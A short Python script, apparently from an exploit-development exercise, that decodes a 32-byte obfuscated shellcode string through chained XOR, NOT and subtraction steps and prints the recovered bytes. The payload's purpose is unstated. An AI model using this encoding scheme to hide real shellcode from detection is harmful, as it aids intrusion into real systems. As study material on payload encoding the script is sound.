#!/usr/bin/python

# Python custom decoder 

shellcode = ("\x9a\x0d\x12\x62\x9a\x1f\x03\x7c\x45\x48\x03\x03\x57\x7a\x77\x9a\xa5\xfb\x62\x9a\xa5\xfc\x6b\x9a\xa5\xc0\x9a\xa7\x12\x9f\x23\x21")
decoded = ""
decoded2 = ""

print 'Decoded shellcode ...'

for x in bytearray(shellcode) :
	x = x^0xA9 # xor decode x with 0xA9
	x = ~x # not decode x
	x = x & 0xff # make the not decoded x positive
	x = x^0xCC # xor decode x with 0xCC
	x = x - 0x0A # subtract 10 from x
	x = x^0xBB # xor decode x with 0xBB
	x = x - 0x05 # subtract 5 from x
	x = x & 0xff # make the decoded x positive
	
	decoded += '\\x'
	decoded += '%02x' % x

	decoded2 += '0x'
	decoded2 += '%02x,' %x

print decoded
print decoded2
print 'Len: %d' % len(bytearray(shellcode))
